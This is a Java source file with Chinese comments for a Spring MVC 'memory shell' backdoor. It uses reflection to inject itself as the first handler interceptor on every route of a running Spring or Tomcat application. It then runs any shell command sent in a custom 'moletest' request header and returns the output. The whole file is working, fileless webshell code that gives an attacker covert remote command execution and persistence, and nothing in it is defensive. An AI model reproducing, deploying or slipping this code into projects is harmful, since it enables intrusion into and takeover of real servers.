import org.springframework.web.context.WebApplicationContext;
import org.springframework.web.context.request.RequestContextHolder;
import org.springframework.web.servlet.HandlerInterceptor;
import org.springframework.web.servlet.ModelAndView;
import org.springframework.web.servlet.handler.AbstractHandlerMapping;
import org.springframework.web.servlet.handler.MappedInterceptor;
import org.springframework.web.servlet.handler.SimpleUrlHandlerMapping;
import org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping;

import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import java.io.PrintWriter;
import java.lang.reflect.Field;
import java.util.List;

/**
 * 适用于 SpringMVC+Tomcat的环境，以及Springboot 2.x 环境.
 *   Springboot 1.x 和 3.x 版本未进行测试
 */
public class SpringInterceptorMemShell implements HandlerInterceptor {

    public SpringInterceptorMemShell() {
        try {
            WebApplicationContext context =
                    (WebApplicationContext) RequestContextHolder.currentRequestAttributes().getAttribute("org.springframework.web.servlet.DispatcherServlet.CONTEXT", 0);

            RequestMappingHandlerMapping mappingHandlerMapping = context.getBean(RequestMappingHandlerMapping.class);
//            SimpleUrlHandlerMapping simpleUrlHandlerMapping = context.getBean(SimpleUrlHandlerMapping.class);

            Field adaptedInterceptorsField = AbstractHandlerMapping.class.getDeclaredField("adaptedInterceptors");
            adaptedInterceptorsField.setAccessible(true);
            List<HandlerInterceptor> adaptedInterceptors = (List<HandlerInterceptor>) adaptedInterceptorsField.get(mappingHandlerMapping);
//            List<HandlerInterceptor> simpleAdaptedInterceptors = (List<HandlerInterceptor>) adaptedInterceptorsField.get(simpleUrlHandlerMapping);

            MappedInterceptor mappedInterceptor =
                    new MappedInterceptor(new String[]{"/**"}, new SpringInterceptorMemShell("abc"));
//            adaptedInterceptors.add(mappedInterceptor); //在列表最后添加
            adaptedInterceptors.add(0, mappedInterceptor); //插到列表首位

            //这一步是可选的，只有当你需要在不存在的路由(即不存在的controller url) 上访问该内存马才用.
//            simpleAdaptedInterceptors.add(mappedInterceptor);
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    public SpringInterceptorMemShell(String anyStr) {

    }

    @Override
    public boolean preHandle(HttpServletRequest request, HttpServletResponse response, Object handler) throws Exception {
//        String scode = request.getParameter("molecode");
        String scode = request.getHeader("moletest");
        if (scode != null) {
            try {
                PrintWriter writer = response.getWriter();
                String o = "";
                ProcessBuilder p;
                if (System.getProperty("os.name").toLowerCase().contains("win")) {
                    p = new ProcessBuilder(new String[]{"cmd.exe", "/c", scode});
                } else {
                    p = new ProcessBuilder(new String[]{"/bin/sh", "-c", scode});
                }
                java.util.Scanner c = new java.util.Scanner(p.start().getInputStream()).useDelimiter("\\A");
                o = c.hasNext() ? c.next() : o;
                c.close();
                writer.write(o);
                writer.flush();
                writer.close();
            } catch (Exception e) {
            }

            return false;
        }

        //返回false的话，整个请求到这里就结束了。
        //  换言之，不再执行后面的拦截器以及Controller的处理.
        //如果返回true，则继续执行后面的拦截器以及Controller的处理.
        return true;
    }

    @Override
    public void postHandle(HttpServletRequest request, HttpServletResponse response, Object handler, ModelAndView modelAndView) throws Exception {

    }

    @Override
    public void afterCompletion(HttpServletRequest request, HttpServletResponse response, Object handler, Exception ex) throws Exception {

    }
}
